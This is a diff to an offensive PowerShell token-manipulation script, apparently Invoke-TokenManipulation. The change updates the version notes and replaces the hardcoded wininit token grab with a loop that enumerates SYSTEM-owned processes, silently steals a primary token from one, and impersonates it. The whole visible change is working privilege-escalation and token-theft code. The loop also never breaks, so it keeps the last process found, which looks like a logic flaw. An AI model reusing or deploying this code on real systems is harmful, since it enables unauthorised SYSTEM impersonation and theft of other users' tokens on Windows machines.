@@ -49,8 +49,8 @@ Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 1.11
-(1.1 -> 1.11: PassThru of System.Diagnostics.Process object added by Rune Mariboe, https://www.linkedin.com/in/runemariboe)
+Version: 1.12
+(1.11 -> 1.12: Simple logic added by Josh M. Bryant to find an unprotected process to grab a SYSTEM token from, rather than hardcoding to wininit, https://www.fixtheexchange.com/)
 
 .DESCRIPTION
 
@@ -1685,8 +1685,15 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $AllTokens = @()
 
         #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
-        #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges, so impersonate the wininit token.
-        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
+        #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges.
+        #We need to enumrate all processes running as SYSTEM and find one that we can use.
+        $SystemTokens = Get-Process -IncludeUserName | Where {$_.Username -eq "NT AUTHORITY\SYSTEM"}
+        ForEach ($SystemToken in $SystemTokens)
+        {
+            $SystemTokenInfo = Get-PrimaryToken -ProcessId $SystemToken.Id -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
+            $SystemProcessName = $SystemToken.Name
+            $SystemProcessID = $SystemToken.Id
+        }
         if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
         {
             Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
